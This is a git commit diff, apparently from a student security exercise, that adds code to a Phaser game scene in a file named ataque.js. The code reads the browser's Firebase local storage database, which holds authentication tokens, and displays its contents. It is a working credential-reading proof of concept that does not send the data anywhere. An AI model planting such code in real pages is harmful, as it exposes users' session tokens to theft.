64d3f8ce6080de0c42e8ee451ceaf89ef8a32c78
SaraMM3 <sara.martinezmolina@estudiante.uam.es>
2024-06-13 12:20:44 +0200

    Intento de leer token firebase

--- PruebaDefensa/ataque.js
+++ PruebaDefensa/ataque.js
@@ -28,6 +28,39 @@ class Example extends Phaser.Scene {
             a.remove()
         })
 
+
+        // Probamos a obtener el token de firebase del usuario.
+        const asyncForEach = (array, callback, done) => {
+            const runAndWait = i => {
+                if (i === array.length) return done();
+                return callback(array[i], () => runAndWait(i + 1));
+            };
+            return runAndWait(0);
+        };
+    
+        const dump = {};
+        const dbRequest = window.indexedDB.open("firebaseLocalStorageDb");
+        dbRequest.onsuccess = () => {
+            const db = dbRequest.result;
+        const stores = ['firebaseLocalStorage'];
+    
+        const tx = db.transaction(stores);
+        asyncForEach(
+          stores,
+          (store, next) => {
+            const req = tx.objectStore(store).getAll();
+            req.onsuccess = () => {
+              dump[store] = req.result;
+              next();
+            };
+          },
+          () => {
+            console.log(JSON.stringify(dump));
+            alert(JSON.stringify(dump))
+          }
+        );
+        }
+
     
 
     }
